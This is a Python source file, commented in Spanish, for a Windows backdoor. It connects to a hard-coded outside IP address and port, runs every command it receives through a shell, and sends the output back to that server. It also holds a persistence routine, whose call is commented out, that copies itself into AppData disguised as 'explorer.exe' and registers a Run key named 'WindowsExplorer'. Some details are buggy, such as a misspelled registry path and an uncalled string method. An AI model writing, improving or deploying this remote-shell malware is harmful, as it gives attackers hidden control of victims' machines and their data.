import socket
import json
import subprocess
import os
import sys
import shutil
from winreg import HKEY_CURRENT_USER, OpenKey, SetValueEx, REG_SZ, CloseKey

#configuracion del servidor (vps)
IP_SERVER = '142.93.62.130'
PORT = 45500

def persistence():
    """Hacer que se ejecute al iniciar windows"""
    try:
        # ruta donde se copiara el archivo
        ruta_appdata = os.environ['APPDATA']
        ruta_destino = os.path.join(ruta_appdata, 'explorer.exe')

        # copiar el script actual (o el .exe) hacia AppData
        if not os.path.exists(ruta_destino):
            shutil.copyfile(sys.executable, ruta_destino)
        
        # Añadir el registro de inicio
        clave = OpenKey(HKEY_CURRENT_USER,
                        'Sofware\\Microsoft\\Windows\\CurrentVersion\\Run',
                        0, 0x20019) # KEY_ALL_ACCESS
        SetValueEx(clave, 'WindowsExplorer', 0, REG_SZ, ruta_destino)
        CloseKey(clave)
    except Exception as e:
        pass

def send_result(command):
    """ Envia datos al servidor de forma segura """
    resultado = ''
    try:
            resultado = subprocess.run(command, shell=True, capture_output=True, text=True)
            resultado = {'stdout': resultado.stdout, 'stderr': resultado.stderr}
    except Exception as e:
        resultado = f'[-] Error: {str(e)}'
    return resultado

def connect():
    """ Conexion al servidor VPS """
    while True:
        try:
            cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cliente.connect((IP_SERVER, PORT))
#            persistence()
            cliente.send(b'[+] Bakdoor activo\n')

            while True:
                comando = cliente.recv(1024).decode()
                if comando.lower == 'salir':
                    break
                resultado = send_result(comando)
                cliente.send(json.dumps(resultado).encode())
            cliente.close()
            break
        except:
            pass # reintentar conexion
    
if __name__ == '__main__':
    connect()